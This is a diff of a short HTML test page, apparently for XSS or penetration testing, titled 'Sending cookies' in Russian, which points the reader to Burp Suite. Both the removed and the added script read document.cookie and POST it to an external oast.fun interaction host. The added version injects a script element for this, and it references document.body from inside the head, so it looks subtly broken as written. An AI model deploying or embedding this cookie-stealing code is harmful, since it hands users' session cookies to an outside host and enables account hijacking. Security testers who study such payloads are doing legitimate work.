@@ -3,32 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <title>Отправка кук</title>
-    <script>
-        // Получаем все клиентские куки
-        const cookies = document.cookie;
-
-        // Формируем данные
-        const data = {
-            cookies: cookies,
-            timestamp: new Date().toISOString()
-        };
-
-        // Отправляем POST-запрос
-        fetch('https://rbpdypiimtovkmpbmwsom1c9paqgxlt2y.oast.fun ', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data),
-            mode: 'no-cors'
-        })
-        .then(() => {
-            console.log('Куки отправлены');
-        })
-        .catch(err => {
-            console.error('Ошибка:', err);
-        });
-    </script>
+<script>
+    const s = document.createElement('script');
+    s.textContent = "fetch('https://rbpdypiimtovkmpbmwsom1c9paqgxlt2y.oast.fun ', { method: 'POST', body: document.cookie });";
+    document.body.appendChild(s);
+</script>
 </head>
 <body>
     <h1>Проверьте консоль или Burp Suite</h1>
